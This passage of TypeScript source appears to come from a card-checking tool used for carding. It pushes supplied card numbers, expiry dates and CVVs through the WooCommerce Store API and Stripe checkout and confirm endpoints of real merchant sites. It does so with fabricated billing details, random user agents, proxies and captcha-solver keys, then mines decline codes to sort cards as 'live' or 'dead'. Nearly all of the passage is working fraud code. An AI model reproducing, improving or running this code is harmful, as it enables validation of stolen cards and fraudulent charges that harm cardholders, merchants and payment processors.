      const tryStoreAddItem = async (productId: number) => {
        const r = await fetch(`${cleanSiteUrl}/wp-json/wc/store/v1/cart/add-item`, {
          method: "POST",
          headers: storeApiHeaders,
          body: JSON.stringify({ id: productId, quantity: 1 }),
          signal: AbortSignal.timeout(8000),
          redirect: "follow",
        });
        const addCookies = parseCookies(r.headers);
        cState = { ...cState, cookies: mergeCookies(cState.cookies, addCookies) };
        const text = await r.text();
        let body: any = {};
        try { body = JSON.parse(text); } catch {}
        const itemsAdded: number = body?.items_count ?? body?.items?.length ?? 0;
        return { resp: r, body, text, itemsAdded };
      };

      try {
        let result = await tryStoreAddItem(parseInt(lastAddedProductId, 10));
        dbg(`[PI-extract] Store API add-item (${result.resp.status}): items=${result.itemsAdded}, body=${result.text.substring(0, 100)}`);

        // If item wasn't added, inspect the error code and retry appropriately
        if (!result.resp.ok || result.itemsAdded === 0) {
          const errCode: string = result.body?.code || "";
          const isOutOfStock = errCode === "woocommerce_rest_product_out_of_stock"
            || errCode.includes("out_of_stock");
          const isVariableErr = errCode.includes("variation")
            || errCode.includes("invalid_product")
            || (result.resp.status === 400 && !isOutOfStock);

          if (isVariableErr) {
            // Variable product � look up its variation IDs and retry with the first one
            try {
              const prodResp = await fetch(
                `${cleanSiteUrl}/wp-json/wc/store/v1/products/${lastAddedProductId}`,
                { headers: storeApiHeaders, signal: AbortSignal.timeout(5000) }
              );
              if (prodResp.ok) {
                const prod = JSON.parse(await prodResp.text());
                const firstVariationId: number | undefined = prod?.variations?.[0]?.id;
                if (firstVariationId) {
                  dbg(`[PI-extract] Variable product � retrying add-item with variation ${firstVariationId}`);
                  result = await tryStoreAddItem(firstVariationId);
                  dbg(`[PI-extract] Store API add-item variation (${result.resp.status}): items=${result.itemsAdded}`);
                }
              }
            } catch {}
          } else if (isOutOfStock) {
            // Product is out of stock � fetch the product list and try a different one
            try {
              const altListResp = await fetch(
                `${cleanSiteUrl}/wp-json/wc/store/v1/products?per_page=10`,
                { headers: storeApiHeaders, signal: AbortSignal.timeout(5000) }
              );
              if (altListResp.ok) {
                const altProducts = JSON.parse(await altListResp.text());
                if (Array.isArray(altProducts)) {
                  // Prefer simple products above Stripe minimum; skip the one that was just rejected
                  const minPrice = (p: any) => parseInt(p?.prices?.price || "0", 10) >= 50;
                  const candidates = [
                    ...altProducts.filter((p: any) => p.type === "simple" && String(p.id) !== lastAddedProductId && minPrice(p)),
                    ...altProducts.filter((p: any) => p.type !== "simple" && String(p.id) !== lastAddedProductId && minPrice(p)),
                    ...altProducts.filter((p: any) => String(p.id) !== lastAddedProductId && !minPrice(p)),
                  ];
                  for (const alt of candidates) {
                    dbg(`[PI-extract] Product ${lastAddedProductId} out of stock, trying alt ${alt.id} (type=${alt.type})`);
                    result = await tryStoreAddItem(alt.id);
                    if (result.itemsAdded > 0) { lastAddedProductId = String(alt.id); break; }
                  }
                }
              }
            } catch {}
          }
        }

        if (result.resp.ok && result.itemsAdded > 0) {
          storeCartHasItems = true;
          // Refresh nonce + cart-token from add-item response (may be a new nonce)
          wcStoreNonce = result.resp.headers.get("Nonce")
            || result.resp.headers.get("nonce")
            || result.resp.headers.get("X-WC-Store-API-Nonce")
            || wcStoreNonce;
          wcCartToken = result.resp.headers.get("Cart-Token") || wcCartToken;
          dbg(`[PI-extract] Store API cart populated: nonce=${!!wcStoreNonce}, cart-token=${!!wcCartToken}`);
        } else {
          dbg(`[PI-extract] Store API add-item: cart still empty after all attempts � skipping Store API checkout`);
        }
      } catch (addErr: any) {
        dbg(`[PI-extract] Store API add-item threw: ${addErr.message}`);
      }
    } else if (lastAddedProductId && !wcStoreNonce) {
      dbg(`[PI-extract] Store API: no nonce from cart GET, cannot add item`);
    }

    // Step 3: Only attempt checkout when items are confirmed in the Store API cart.
    // Never run checkout against an empty cart � WC returns woocommerce_rest_cart_empty.
    if (wcStoreNonce && storeCartHasItems) {
      dbg(`[PI-extract] Trying WC Store API checkout, nonce=${!!wcStoreNonce}`);

      // Build billing / shipping once � only the payment_method slug varies per attempt.
      // Country-aware phone shape: a +1...US number on a GB billing address can
      // trip phone-format validators ("invalid phone"). Pick a country prefix
      // that matches the billing country so the validator stops here.
      const COUNTRY_DIAL: Record<string, { prefix: string; len: number }> = {
        US: { prefix: "+1",  len: 10 },
        CA: { prefix: "+1",  len: 10 },
        GB: { prefix: "+44", len: 10 },
        AU: { prefix: "+61", len: 9  },
        DE: { prefix: "+49", len: 10 },
        FR: { prefix: "+33", len: 9  },
        IT: { prefix: "+39", len: 10 },
        ES: { prefix: "+34", len: 9  },
        NL: { prefix: "+31", len: 9  },
        IN: { prefix: "+91", len: 10 },
        JP: { prefix: "+81", len: 10 },
        BR: { prefix: "+55", len: 10 },
        MX: { prefix: "+52", len: 10 },
      };
      const dial = COUNTRY_DIAL[(billing.country || "US").toUpperCase()] || COUNTRY_DIAL.US;
      const synthPhone = extras?.billingPhone
        || dial.prefix + Array.from({ length: dial.len }, () => Math.floor(Math.random() * 10)).join("");
      const billingAddr = {
        first_name: name.split(" ")[0],
        last_name:  name.split(" ")[1] || "Smith",
        address_1:  (billing as any).line1 || `${Math.floor(Math.random() * 9000) + 100} Main St`,
        address_2:  "",
        city:        billing.city,
        state:       billing.stateCode,
        postcode:    billing.zip,
        country:     billing.country,
        email,
        phone:       synthPhone,
      };
      // Shipping address MUST mirror billing (some sites validate phone+email
      // on shipping as strictly as billing). Real failure: site returned
      // woocommerce_rest_invalid_address {"shipping":["Phone is required"]}
      // because we omitted phone/email on shipping. Now sent on both.
      const shippingAddr = {
        first_name: billingAddr.first_name,
        last_name:  billingAddr.last_name,
        address_1:  billingAddr.address_1,
        address_2:  "",
        city:        billingAddr.city,
        state:       billingAddr.state,
        postcode:    billingAddr.postcode,
        country:     billingAddr.country,
        email:       billingAddr.email,
        phone:       billingAddr.phone,
      };

      const storeExtraHeaders: Record<string, string> = { "Nonce": wcStoreNonce };
      if (wcCartToken) storeExtraHeaders["Cart-Token"] = wcCartToken;

      // Try slug variants: some sites register as "stripe_cc", "stripe_checkout",
      // or "woocommerce_payments" rather than the default "stripe".
      // Only retry on payment_method_disabled or rest_invalid_param;
      // all other errors mean the issue is with the cart/billing, not the slug.
      // If the user set a specific slug override, try that first.
      const pmSlugs = extras?.wcPaySlug
        ? [extras.wcPaySlug, ...["stripe", "stripe_cc", "stripe_checkout", "woocommerce_payments"].filter(s => s !== extras.wcPaySlug)]
        : ["stripe", "stripe_cc", "stripe_checkout", "woocommerce_payments"];
      let storeCs: string | null = null;

      for (const pmSlug of pmSlugs) {
        const isWcPay = pmSlug === "woocommerce_payments";
        const paymentData = isWcPay
          ? [
              { key: "wcpay-payment-method", value: "" },
              { key: "payment_method",       value: "woocommerce_payments" },
            ]
          : [
              { key: "wc-stripe-payment-method",            value: "" },
              { key: "wc-stripe-payment-type",              value: "card" },
              { key: "wc_stripe_selected_upe_payment_type", value: "card" },
            ];
        const storeCheckoutBody = JSON.stringify({
          billing_address:  billingAddr,
          shipping_address: shippingAddr,
          payment_method: pmSlug,
          payment_data: paymentData,
        });

        const storeResp = await sessionFetch(`${cleanSiteUrl}/wp-json/wc/store/v1/checkout`, cState, {
          method: "POST",
          body: storeCheckoutBody,
          contentType: "application/json",
          referer: `${cleanSiteUrl}${extras?.checkoutPath || "/checkout/"}`,
          origin: cleanSiteUrl,
          accept: "application/json",
          timeout: 10000,
          extraHeaders: storeExtraHeaders,
        });
        cState = storeResp.state;
        dbg(`[PI-extract] Store API checkout (${pmSlug}) response (${storeResp.text.length} chars): ${storeResp.text.substring(0, 300)}`);

        let storeBody: any = {};
        try { storeBody = JSON.parse(storeResp.text); } catch {}

        // If this slug is disabled or invalid, loop to the next one
        if (storeBody?.code === "woocommerce_rest_checkout_payment_method_disabled") {
          dbg(`[PI-extract] Payment method "${pmSlug}" disabled, trying next slug`);
          continue;
        }
        if (storeBody?.code === "rest_invalid_param" && storeBody?.data?.params?.payment_method) {
          // WC tells us which slugs are valid � extract them and inject into the queue
          const validMatch = storeBody.message?.match(/is not one of ([^.]+)/);
          if (validMatch) {
            const validSlugs = validMatch[1].split(",").map((s: string) => s.trim()).filter(Boolean);
            const remaining = validSlugs.filter((s: string) => !pmSlugs.includes(s));
            if (remaining.length > 0) {
              dbg(`[PI-extract] Slug "${pmSlug}" invalid � WC says valid: [${validSlugs.join(", ")}], injecting ${remaining.length} new slugs`);
              pmSlugs.push(...remaining);
            } else {
              dbg(`[PI-extract] Slug "${pmSlug}" invalid � all valid slugs already queued`);
            }
          } else {
            dbg(`[PI-extract] Slug "${pmSlug}" invalid (rest_invalid_param), trying next`);
          }
          continue;
        }

        // Detect: WC created the order but payment was declined at the processor
        // (e.g. Stripe returned card_declined ? WC set order status="failed").
        // There is no client_secret in this response, so we signal the decline
        // directly so the caller can return a proper dead result.
        if (storeBody?.status === "failed" && storeBody?.order_id) {
          // Dig for the REAL decline reason. WC's top-level "message" is often
          // the generic catch-all ("Payment processing failed. Please retry.")
          // that swallowed the underlying Stripe error � but the real code is
          // frequently still present in payment_result.payment_details, or
          // embedded somewhere in the raw body. Check every known location +
          // scan for a Stripe decline code before settling for the generic msg.
          const details = storeBody?.payment_result?.payment_details
                       || storeBody?.payment_details
                       || storeBody?.data?.payment_result?.payment_details;
          let failMsg = "";
          let declineCode = "";
          if (Array.isArray(details)) {
            // WC PaymentDetails is [{key, value}]. Pull every signal we can.
            const get = (k: string) => details.find((d: any) => d?.key === k)?.value;
            const errMsg  = get("errorMessage") || get("error_message") || get("message");
            const errCode = get("errorCode")    || get("error_code")    || get("code")
                         || get("declineCode")   || get("decline_code");
            if (errCode) declineCode = String(errCode);
            if (errMsg)  failMsg = String(errMsg);
          }
          // Scan the raw body for an explicit Stripe decline code � WC sometimes
          // leaves it in a nested intent/charge object even when the surfaced
          // message is generic. (e.g. "decline_code":"insufficient_funds")
          if (!declineCode) {
            const codeM = storeResp.text.match(/"decline_code"\s*:\s*"([a-z_]+)"/i)
                       || storeResp.text.match(/"(?:error_)?code"\s*:\s*"((?:card_declined|insufficient_funds|do_not_honor|incorrect_cvc|invalid_cvc|expired_card|incorrect_number|stolen_card|lost_card|fraudulent|generic_decline|authentication_required|pickup_card|card_velocity_exceeded|currency_not_supported|card_not_supported|processing_error))"/i);
            if (codeM) declineCode = codeM[1];
          }
          // Fall back to the generic top-level message only when nothing better.
          if (!failMsg) failMsg = String(storeBody?.message || extractBetween(storeResp.text, '"message":"', '"') || "Payment Declined");

          // LAST-DITCH RICH CAPTURE: when we got the generic "Payment processing
          // failed. Please retry." with NO code, the real Stripe error is
          // usually in the order's customer-facing order-received page (or in
          // wc-api?wc_order_<key> details). Best-effort fetch � non-blocking,
          // short timeout. Anything found just enriches the message; we never
          // block the caller waiting for it past 4s.
          const isGeneric = !declineCode && /payment processing failed/i.test(failMsg);
          const orderKey = storeBody?.order_key;
          if (isGeneric && orderKey) {
            try {
              const orderUrl = `${cleanSiteUrl}/checkout/order-received/${storeBody.order_id}/?key=${encodeURIComponent(orderKey)}`;
              const orderResp = await sessionFetch(orderUrl, cState, { timeout: 4000, maxRetries: 0 });
              cState = orderResp.state;
              if (orderResp.ok && orderResp.text) {
                // Hunt for an explicit Stripe code or a human-readable error
                // line in the order page � WC often renders "Reason: <message>"
                // or shows the Stripe error inside a notice block.
                const orderCode = orderResp.text.match(/"decline_code"\s*:\s*"([a-z_]+)"/i)?.[1]
                  || orderResp.text.match(/\b(insufficient_funds|do_not_honor|card_declined|incorrect_cvc|expired_card|fraudulent|generic_decline|authentication_required|card_velocity_exceeded)\b/i)?.[1];
                if (orderCode) {
                  declineCode = orderCode;
                  dbg(`[PI-extract] enriched from order page: decline_code=${orderCode}`);
                } else {
                  // Pull a human-readable reason from the page if present.
                  const reasonM = orderResp.text.match(/<li[^>]*class=["'][^"']*woocommerce-error[^"']*["'][^>]*>([^<]{4,200})</i)
                    || orderResp.text.match(/Reason:\s*([^<\n]{4,200})/i)
                    || orderResp.text.match(/"errorMessage"\s*:\s*"([^"]{4,200})"/i);
                  if (reasonM) {
                    failMsg = reasonM[1].trim();
                    dbg(`[PI-extract] enriched from order page: msg="${failMsg.slice(0, 80)}"`);
                  }
                }
              }
            } catch { /* enrichment is best-effort, never blocks */ }
          }

          dbg(`[PI-extract] WC Store order #${storeBody.order_id} status=failed: msg="${failMsg}" code="${declineCode || "(none)"}"`);
          return {
            clientSecret: "",
            piId: "",
            state: cState,
            // Pass the structured code through so the caller can route a real
            // Stripe code through classifyDeclineCode (proper CCN/CVV LIVE vs
            // dead) instead of treating everything as a flat decline.
            wcDeclined: { message: failMsg, orderId: Number(storeBody.order_id), declineCode },
          };
        }

        storeCs = extractBetween(storeResp.text, '"client_secret":"', '"')
          || extractBetween(storeResp.text, '"clientSecret":"', '"')
          || extractBetween(storeResp.text, 'client_secret=', '&')
          || extractBetween(storeResp.text, 'client_secret=', '"');
        break;  // Received a non-disabled response � stop regardless of whether we got a secret
      }

      if (storeCs) {
        dbg(`[PI-extract] Got Store API client_secret: ${storeCs.substring(0, 30)}...`);
        return { clientSecret: storeCs, piId: storeCs.split("_secret_")[0], state: cState };
      }
    }
  } catch (storeErr: any) {
    dbg(`[PI-extract] Store API checkout failed: ${storeErr.message}`);
  }

  return null;
  })();

  const directResult = await Promise.race([
    directSetupPromise,
    new Promise<null>((resolve) => setTimeout(() => resolve(null), 5000)),
  ]);
  if (directResult) {
    // Attach the resolved cart amount / product id so callers can render
    // "Charged $X.XX (product Y)" in the response string.
    return {
      ...directResult,
      ...(detectedAmount ? { detectedAmount } : {}),
      ...(lastAddedProductId ? { detectedProductId: lastAddedProductId } : {}),
      ...(detectedProductName ? { detectedProductName } : {}),
    };
  }

  // Cart-flow timeout � bumped 18s ? 32s. Real failure that motivated this:
  // a check on a slow site with a transient proxy fault total-clocked 27s;
  // the cart flow DID complete with a real wcDeclined (Store API checkout
  // failed-order response) but the 18s race had already lost, so the caller
  // received null and fell back to the tokenize-only result. Logs even showed
  // the [PI-extract] cart-flow output printing after the race had resolved.
  // 32s is generous enough for the worst proxy-retry path while still
  // bounding overall check latency under the 60s gate cap.
  let cartRaceWon = true;
  const cartResult = await Promise.race([
    cartFlowPromise,
    new Promise<null>((resolve) => setTimeout(() => { cartRaceWon = false; resolve(null); }, 32000)),
  ]);
  if (cartResult) {
    return {
      ...cartResult,
      ...(detectedAmount ? { detectedAmount } : {}),
      ...(lastAddedProductId ? { detectedProductId: lastAddedProductId } : {}),
      ...(detectedProductName ? { detectedProductName } : {}),
    };
  }
  if (!cartRaceWon) {
    // Diagnostic: when the timeout wins, the cart flow may still be running
    // and emit its dbg lines later. Tell the operator that's what happened
    // so they don't chase a phantom "we got the checkout but it shows
    // Tokenized" bug � it's a timing bug.
    dbg(`[PI-extract] cart flow timed out at 32s � caller will fall back to tokenize result; any later [PI-extract] lines are from the abandoned cart promise`);
  }
  return null;
}

export async function checkCardStripeCheckoutSession(
  cardNumber: string,
  expMonth: string,
  expYear: string,
  cvv: string,
  publicKey: string,
  gateName: string,
  siteUrl: string,
  extras?: GateExtras,
): Promise<CheckResult> {
  const start = Date.now();
  let month = expMonth.trim().padStart(2, "0");
  let year = expYear.trim();
  if (year.length === 4) year = year.slice(-2);
  const fullCardInfo = `${cardNumber.trim()}|${month}|${year}|${cvv.trim()}`;
  const cleanSiteUrl = siteUrl.replace(/\/+$/, "");
  const ua = pick(USER_AGENTS);
  const secChUa = pick(SEC_CH_UA_OPTIONS);
  const billing = await pickBilling(cardNumber);
  const name = extras?.billingName || rndName();
  const email = extras?.billingEmail || rndEmail();

  try {
    const state: SessionState = { ua, secChUa, cookies: extras?.rawCookies || "", proxy: extras?.proxyOverride || (await getProxy(extras?.proxyCountry)) || undefined, captchaProvider: extras?.captchaProvider, captchaApiKey: extras?.captchaApiKey };

    const tokenizePromise = stripeTokenize(cardNumber.trim(), month, year, cvv.trim(), publicKey, gateName, cleanSiteUrl, start);

    const checkoutPaths = extras?.checkoutPath
      ? [extras.checkoutPath, "/checkout/", "/pay/", "/donate/", "/"]
      : ["/checkout/", "/pay/", "/donate/", "/"];

    let clientSecret: string | null = null;
    let cState = { ...state };

    for (const cp of checkoutPaths) {
      try {
        const pageResp = await sessionFetch(`${cleanSiteUrl}${cp}`, cState, { timeout: 10000 });
        cState = pageResp.state;
        const html = pageResp.text;

        const csPatterns = [
          /initEmbeddedCheckout\s*\(\s*\{[^}]*clientSecret\s*:\s*['"]((cs|pi|seti)_[^'"]+)['"]/,
          /clientSecret\s*['":\s]+['"](cs_[^'"]+)['"]/,
          /client_secret\s*['":\s]+['"](cs_[^'"]+)['"]/,
          /clientSecret\s*['":\s]+['"](pi_[^'"]+_secret_[^'"]+)['"]/,
          /client_secret\s*['":\s]+['"](pi_[^'"]+_secret_[^'"]+)['"]/,
          /clientSecret\s*['":\s]+['"](seti_[^'"]+_secret_[^'"]+)['"]/,
        ];
        for (const pat of csPatterns) {
          const m = html.match(pat);
          if (m) { clientSecret = m[1]; break; }
        }

        if (!clientSecret) {
          clientSecret = extractBetween(html, '"clientSecret":"cs_', '"');
          if (clientSecret) clientSecret = `cs_${clientSecret}`;
        }
        if (!clientSecret) {
          clientSecret = extractBetween(html, '"clientSecret":"pi_', '"');
          if (clientSecret) clientSecret = `pi_${clientSecret}`;
        }

        if (clientSecret) {
          dbg(`[checkout-session] Found clientSecret on ${cp}: ${clientSecret.substring(0, 30)}...`);
          break;
        }
      } catch (e: any) {
        dbg(`[checkout-session] Path ${cp} failed: ${e.message}`);
      }
    }

    if (!clientSecret) {
      const tokenResult = await tokenizePromise;
      tokenResult.cardInfo = fullCardInfo;
      return tokenResult;
    }

    const tokenResult = await tokenizePromise;
    let cardMeta = { brand: "UNKNOWN", funding: "unknown", country: "??", threeDs: "", billing };
    if (tokenResult?.response) {
      const bm = tokenResult.response.match(/\b(VISA|MASTERCARD|AMEX|DISCOVER|JCB|DINERS)\b/i);
      const fm = tokenResult.response.match(/\b(debit|credit|prepaid)\b/i);
      const cm = tokenResult.response.match(/\[([A-Z]{2})\]/);
      const tm = tokenResult.response.match(/\b(3DS|NO-3DS)\b/);
      if (bm) cardMeta.brand = bm[1].toUpperCase();
      if (fm) cardMeta.funding = fm[1].toLowerCase();
      if (cm) cardMeta.country = cm[1];
      if (tm) cardMeta.threeDs = tm[1];
    }

    if (clientSecret.startsWith("cs_")) {
      const csResp = await fetch(`https://api.stripe.com/v1/checkout/sessions?client_secret=${clientSecret}&key=${publicKey}&expand[0]=payment_intent`, {
        headers: { "User-Agent": ua, Origin: "https://js.stripe.com", Referer: "https://js.stripe.com/" },
        signal: AbortSignal.timeout(8000),
      });
      const csData = await csResp.json();
      dbg(`[checkout-session] Session lookup: status=${csData?.payment_intent?.status || csData?.status || "?"}`);

      const piCs = csData?.payment_intent?.client_secret;
      const setiCs = csData?.setup_intent?.client_secret;
      if (piCs) clientSecret = piCs;
      else if (setiCs) clientSecret = setiCs;
      else {
        return {
          status: tokenResult.status,
          response: tokenResult.response + " | Checkout Session (no PI)",
          code: tokenResult.code,
          latency: Date.now() - start,
          gate: gateName,
          cardInfo: fullCardInfo,
        };
      }
    }

    // The cs_ resolution above may reassign clientSecret from an any-typed JSON
    // field, which drops the earlier non-null narrowing � re-assert it here.
    if (!clientSecret) {
      return {
        status: tokenResult.status,
        response: tokenResult.response + " | No client secret",
        code: tokenResult.code,
        latency: Date.now() - start,
        gate: gateName,
        cardInfo: fullCardInfo,
      };
    }

    const isSetupIntent = clientSecret.startsWith("seti_");
    const intentType = isSetupIntent ? "setup_intents" : "payment_intents";
    const intentId = clientSecret.split("_secret_")[0];

    const stripeVer = pick(STRIPE_JS_VERSIONS);
    const confirmBody = new URLSearchParams({
      "payment_method_data[type]": "card",
      "payment_method_data[card][number]": cardNumber.trim(),
      "payment_method_data[card][cvc]": cvv.trim(),
      "payment_method_data[card][exp_month]": month,
      "payment_method_data[card][exp_year]": year,
      "payment_method_data[billing_details][name]": name,
      "payment_method_data[billing_details][email]": email,
      "payment_method_data[billing_details][address][postal_code]": billing.zip,
      "payment_method_data[billing_details][address][country]": billing.country,
      expected_payment_method_type: "card",
      use_stripe_sdk: "true",
      key: publicKey,
      client_secret: clientSecret,
      payment_user_agent: `stripe.js/${stripeVer}; stripe-js-v3/${stripeVer}; payment-element`,
      "expand[0]": "payment_method",
      "expand[1]": "latest_charge.payment_method_details",
    });

    const confirmResp = await fetch(stripeConnectUrl(`https://api.stripe.com/v1/${intentType}/${intentId}/confirm`, extras?.connectedAccount), {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": ua,
        "sec-ch-ua": secChUa,
        Origin: "https://js.stripe.com",
        Referer: "https://js.stripe.com/",
      },
      body: confirmBody.toString(),
      signal: AbortSignal.timeout(15000),
    });
    const confirmResult = await confirmResp.json();
    dbg(`[checkout-session] Confirm ${intentType}/${intentId}: status=${confirmResult.status || "none"}, error=${confirmResult.error?.code || "none"}`);

    if (confirmResult.payment_method?.card) {
      const c = confirmResult.payment_method.card;
      cardMeta = {
        brand: (c.brand || "unknown").toUpperCase(),
        funding: c.funding || "unknown",
        country: c.country || "??",
        threeDs: c.three_d_secure_usage?.supported ? "3DS" : "NO-3DS",
        billing,
      };
    }

    const classified = await classifyAndUpgrade3DS(confirmResult, gateName, cardMeta, ua, secChUa, publicKey, extras?.connectedAccount);
    classified.latency = Date.now() - start;
    classified.cardInfo = fullCardInfo;
    return classified;
  } catch (e: any) {
    return { status: "error", response: `Checkout Session Error: ${e.message}`, code: "network_error", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
  }
}

// --- Stripe Payment Page confirm (low-value $1-3 page checkouts) ------------
/**
 * Some sites embed a Stripe "Payment Page" (cs_� checkout session id surfaced
 * directly in the page, often guarded by a passive bot-check) and confirm via
 * POST /v1/payment_pages/{cs_id}/confirm � distinct from the Checkout Sessions
 * API flow in checkCardStripeCheckoutSession, which resolves the underlying
 * payment_intent and confirms via /v1/payment_intents/{id}/confirm instead.
 */
export async function checkCardStripePageConfirm(
  cardNumber: string,
  expMonth: string,
  expYear: string,
  cvv: string,
  publicKey: string,
  gateName: string,
  siteUrl: string,
  extras?: GateExtras,
): Promise<CheckResult> {
  const start = Date.now();
  let month = expMonth.trim().padStart(2, "0");
  let year = expYear.trim();
  if (year.length === 4) year = year.slice(-2);
  const fullCardInfo = `${cardNumber.trim()}|${month}|${year}|${cvv.trim()}`;
  const cleanSiteUrl = siteUrl.replace(/\/+$/, "");
  const ua = pick(USER_AGENTS);
  const secChUa = pick(SEC_CH_UA_OPTIONS);
  const billing = await pickBilling(cardNumber);
  const name  = extras?.billingName  || rndName();
  const email = extras?.billingEmail || rndEmail();

  try {
    const tokenizePromise = stripeTokenize(cardNumber.trim(), month, year, cvv.trim(), publicKey, gateName, cleanSiteUrl, start);
    let state: SessionState = { ua, secChUa, cookies: extras?.rawCookies || "", proxy: extras?.proxyOverride || (await getProxy(extras?.proxyCountry)) || undefined, captchaProvider: extras?.captchaProvider, captchaApiKey: extras?.captchaApiKey };

    // The payment-page URL is either siteUrl itself or siteUrl+checkoutPath
    const pagePaths = extras?.checkoutPath ? [extras.checkoutPath, ""] : ["", "/checkout/", "/pay/"];
    let html = "";
    for (const p of pagePaths) {
      try {
        const url = p ? `${cleanSiteUrl}${p}` : cleanSiteUrl;
        const resp = await sessionFetch(url, state, { timeout: 12000 });
        state = resp.state;
        if (resp.ok && resp.text) { html = resp.text; break; }
      } catch {}
    }

    // Checkout-session id can be embedded in the page or already be part of siteUrl
    const csM = html.match(/(cs_(?:live|test)_[A-Za-z0-9]+)/) || cleanSiteUrl.match(/(cs_(?:live|test)_[A-Za-z0-9]+)/);
    const csId = csM?.[1];
    if (!csId) {
      dbg(`[page-confirm] ${gateName}: no checkout-session id found � falling back to tokenize`);
      const tokenResult = await tokenizePromise;
      tokenResult.cardInfo = fullCardInfo;
      return tokenResult;
    }

    // passive_captcha_token � present on pages protected by Stripe's passive bot-check
    const captchaM = html.match(/passive_captcha_token["':\s]+["']([^"']+)["']/)
      || html.match(/"pct"\s*:\s*"([^"]+)"/);
    const passiveCaptchaToken = captchaM?.[1] || "";

    const tokenResult = await tokenizePromise;
    let cardMeta = { brand: "UNKNOWN", funding: "unknown", country: "??", threeDs: "", billing };
    if (tokenResult?.response) {
      const bm = tokenResult.response.match(/\b(VISA|MASTERCARD|AMEX|DISCOVER|JCB|DINERS)\b/i);
      const fm = tokenResult.response.match(/\b(debit|credit|prepaid)\b/i);
      const cm = tokenResult.response.match(/\[([A-Z]{2})\]/);
      const tm = tokenResult.response.match(/\b(3DS|NO-3DS)\b/);
      if (bm) cardMeta.brand = bm[1].toUpperCase();
      if (fm) cardMeta.funding = fm[1].toLowerCase();
      if (cm) cardMeta.country = cm[1];
      if (tm) cardMeta.threeDs = tm[1];
    }

    const stripeVer = pick(STRIPE_JS_VERSIONS);
    const confirmBody = new URLSearchParams({
      "payment_method_data[type]": "card",
      "payment_method_data[card][number]": cardNumber.trim(),
      "payment_method_data[card][cvc]": cvv.trim(),
      "payment_method_data[card][exp_month]": month,
      "payment_method_data[card][exp_year]": year,
      "payment_method_data[billing_details][name]": name,
      "payment_method_data[billing_details][email]": email,
      "payment_method_data[billing_details][address][postal_code]": billing.zip,
      "payment_method_data[billing_details][address][country]": billing.country,
      expected_payment_method_type: "card",
      use_stripe_sdk: "true",
      key: publicKey,
      payment_user_agent: `stripe.js/${stripeVer}; stripe-js-v3/${stripeVer}; payment-element`,
      "expand[0]": "payment_method",
      "expand[1]": "latest_charge.payment_method_details",
    });
    if (passiveCaptchaToken) confirmBody.set("passive_captcha_token", passiveCaptchaToken);

    const confirmResp = await fetch(`https://api.stripe.com/v1/payment_pages/${csId}/confirm`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": ua,
        "sec-ch-ua": secChUa,
        Origin: "https://js.stripe.com",
        Referer: "https://js.stripe.com/",
      },
      body: confirmBody.toString(),
      signal: AbortSignal.timeout(15000),
    });
    const confirmResult = await confirmResp.json();
    dbg(`[page-confirm] Confirm payment_pages/${csId}: status=${confirmResult.status || "none"}, error=${confirmResult.error?.code || "none"}`);

    if (confirmResult.payment_method?.card) {
      const c = confirmResult.payment_method.card;
      cardMeta = {
        brand: (c.brand || "unknown").toUpperCase(),
        funding: c.funding || "unknown",
        country: c.country || "??",
        threeDs: c.three_d_secure_usage?.supported ? "3DS" : "NO-3DS",
        billing,
      };
    }

    const classified = await classifyAndUpgrade3DS(confirmResult, gateName, cardMeta, ua, secChUa, publicKey, extras?.connectedAccount);
    classified.latency = Date.now() - start;
    classified.cardInfo = fullCardInfo;
    return classified;
  } catch (e: any) {
    return { status: "error", response: `Page Confirm Error: ${e.message}`, code: "network_error", latency: Date.now() - start, gate: gateName, cardInfo: fullCardInfo };
  }
}

export async function checkCardStripeCharge(
  cardNumber: string,
  expMonth: string,
  expYear: string,
  cvv: string,
  publicKey: string,
  gateName: string,
  siteUrl: string,
  extras?: GateExtras
): Promise<CheckResult> {
  const start = Date.now();
  let month = expMonth.trim().padStart(2, "0");
  let year = expYear.trim();
  if (year.length === 4) year = year.slice(-2);
  const fullCardInfo = `${cardNumber.trim()}|${month}|${year}|${cvv.trim()}`;
  const cleanSiteUrl = siteUrl.replace(/\/+$/, "");
  const ua = pick(USER_AGENTS);
  const secChUa = pick(SEC_CH_UA_OPTIONS);
  const billing = await pickBilling(cardNumber);
  const name      = extras?.billingName  || rndName();
  const email     = extras?.billingEmail || rndEmail();

  try {
    let state: SessionState = { ua, secChUa, cookies: extras?.rawCookies || "", proxy: extras?.proxyOverride || (await getProxy(extras?.proxyCountry)) || undefined, captchaProvider: extras?.captchaProvider, captchaApiKey: extras?.captchaApiKey };

    const tokenizePromise = stripeTokenize(cardNumber.trim(), month, year, cvv.trim(), publicKey, gateName, cleanSiteUrl, start);

    if (!cleanSiteUrl) {
      const tokenResult = await tokenizePromise;
      tokenResult.cardInfo = fullCardInfo;
      return tokenResult;
    }

    // Non-WC platforms have a completely different checkout � skip the WC cart/PI
    // extraction flow and return the tokenize result directly.
    if (extras?.platform && extras.platform !== "woocommerce") {
      const tokenResult = await tokenizePromise;
      tokenResult.cardInfo = fullCardInfo;
      return tokenResult;
    }

    const siteCheckPromise = (async (): Promise<CheckResult | null> => {
      try {
        const piResult = await Promise.race([
          extractPaymentIntentFromSite(cleanSiteUrl, state, billing, name, email, extras),
          new Promise<null>((resolve) => setTimeout(() => resolve(null), 20000)),
        ]);

        if (piResult) {
          // -- WC Store API: order created but payment declined at the processor --
          // e.g. {"status":"failed","order_id":1970,...} � no client_secret returned.
          // We surface this as a bank-confirmed decline (dead) with the reason message.
          if (piResult.wcDeclined) {
            const { message: wcMsg, orderId: wcOrderId, declineCode: wcCode } = piResult.wcDeclined;
            // Grab any brand info the parallel tokenize managed to produce
            const tokenResult = await tokenizePromise;
            let declineMeta = { brand: "UNKNOWN", funding: "unknown", country: "??" };
            if (tokenResult?.response) {
              const bm = tokenResult.response.match(/\b(VISA|MASTERCARD|AMEX|DISCOVER|JCB|DINERS)\b/i);
              const fm = tokenResult.response.match(/\b(debit|credit|prepaid)\b/i);
              const cm = tokenResult.response.match(/\[([A-Z]{2})\]/);
              if (bm) declineMeta.brand   = bm[1].toUpperCase();
              if (fm) declineMeta.funding = fm[1].toLowerCase();
              if (cm) declineMeta.country = cm[1];
            }
            // Capture the WC error message + order id so the AI Analyzer has
            // the actual site-side text, not just our formatted summary.
            const rawSnip = `WC order #${wcOrderId} status=failed: ${wcMsg}`.slice(0, 1000);

            // BEST CASE: the Store API exposed a real Stripe decline code (dug
